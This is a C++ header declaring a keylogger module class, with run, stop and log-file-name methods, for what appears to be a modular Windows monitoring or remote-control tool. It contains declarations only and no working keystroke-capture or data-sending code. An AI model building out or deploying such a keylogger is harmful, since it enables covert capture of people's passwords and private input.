#pragma once
#include "../module.h"
#include <string>
#include <windows.h>
#include <fstream>
#include <vector>
#include <msgpack.hpp>

class Keylogger_Module : public Module{
public:
    const char* name() const override;
    void run() override;

    const char* getKeylogFileName() const;
    void stopKeylogger();
};